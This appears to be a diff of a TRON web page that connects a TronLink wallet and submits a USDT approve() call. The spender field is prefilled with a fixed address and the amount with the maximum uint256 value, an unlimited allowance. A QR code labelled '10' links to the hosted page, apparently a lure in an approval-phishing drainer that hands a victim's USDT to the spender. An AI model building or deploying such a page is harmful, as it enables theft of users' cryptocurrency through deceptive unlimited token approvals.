@@ -36,17 +36,6 @@
       border-radius:16px;
     }
 
-    input {
-      width:100%;
-      padding:12px;
-      margin-top:10px;
-      border-radius:10px;
-      border:none;
-      background:#1b2a4a;
-      color:white;
-      outline:none;
-    }
-
     button {
       width:100%;
       padding:12px;
@@ -60,6 +49,17 @@
     .blue { background:#3b82f6; color:white; }
     .green { background:#22c55e; color:white; }
 
+    input {
+      width:100%;
+      padding:12px;
+      margin-top:10px;
+      border-radius:10px;
+      border:none;
+      background:#1b2a4a;
+      color:white;
+      outline:none;
+    }
+
     #status {
       margin-top:12px;
       font-size:13px;
@@ -68,13 +68,27 @@
       text-align:center;
     }
 
-    #qrcode {
+    .qr-wrap {
       margin-top:15px;
       display:flex;
-      justify-content:center;
+      flex-direction:column;
+      align-items:center;
+    }
+
+    #qrcode {
       background:white;
       padding:10px;
       border-radius:10px;
+    }
+
+    .qr-label {
+      margin-top:10px;
+      background:#22c55e;
+      padding:6px 14px;
+      border-radius:8px;
+      font-size:14px;
+      font-weight:bold;
+      color:white;
     }
   </style>
 </head>
@@ -84,7 +98,7 @@
 <div class="app">
   <div class="card">
 
-    <button class="blue" onclick="connectWallet()">Connect Wallet</button>
+    <button class="blue" onclick="connectWallet()">Connect</button>
 
     <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
     <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935" />
@@ -93,69 +107,65 @@
 
     <div id="status"></div>
 
-    <div id="qrcode"></div>
+    <div class="qr-wrap">
+      <div id="qrcode"></div>
+      <div class="qr-label">10</div>
+    </div>
 
   </div>
 </div>
 
 <script>
 
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
-let userAddress = null;
+const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
+let user = null;
 
-/* WALLET */
-function detectWallet() {
-  let tries = 0;
+/* detect wallet */
+function detect() {
+  let i = 0;
 
-  const interval = setInterval(() => {
-    tries++;
+  const t = setInterval(() => {
+    i++;
 
     if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
-      userAddress = window.tronWeb.defaultAddress.base58;
-
-      document.getElementById("status").innerText =
-        userAddress;
-
-      clearInterval(interval);
-      return;
+      user = window.tronWeb.defaultAddress.base58;
+      document.getElementById("status").innerText = user;
+      clearInterval(t);
     }
 
-    if (tries > 20) clearInterval(interval);
+    if (i > 20) clearInterval(t);
 
   }, 500);
 }
 
-/* CONNECT */
+/* connect */
 async function connectWallet() {
   try {
-
     if (!window.tronLink) return;
 
     await window.tronLink.request({ method: "tron_requestAccounts" });
 
-    userAddress = window.tronWeb.defaultAddress.base58;
-
-    document.getElementById("status").innerText = userAddress;
+    user = window.tronWeb.defaultAddress.base58;
+    document.getElementById("status").innerText = user;
 
   } catch (e) {
     document.getElementById("status").innerText = e.message;
   }
 }
 
-/* APPROVE */
+/* approve */
 async function approveUSDT() {
   try {
-
-    if (!userAddress) return;
+    if (!user) return;
 
     const spender = document.getElementById("spender").value;
     const amount = document.getElementById("amount").value;
 
-    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+    const c = await window.tronWeb.contract().at(CONTRACT);
 
-    const amountInSun = window.tronWeb.toSun(amount);
+    const sun = window.tronWeb.toSun(amount);
 
-    await contract.approve(spender, amountInSun).send();
+    await c.approve(spender, sun).send();
 
     document.getElementById("status").innerText = "OK";
 
@@ -165,7 +175,7 @@ async function approveUSDT() {
 }
 
 /* QR */
-function generateQR() {
+function qr() {
   new QRCode(document.getElementById("qrcode"), {
     text: "https://approve-d-app-mt1q.vercel.app",
     width: 150,
@@ -173,10 +183,10 @@ function generateQR() {
   });
 }
 
-window.addEventListener("load", () => {
-  detectWallet();
-  generateQR();
-});
+window.onload = () => {
+  detect();
+  qr();
+};
 
 </script>
 
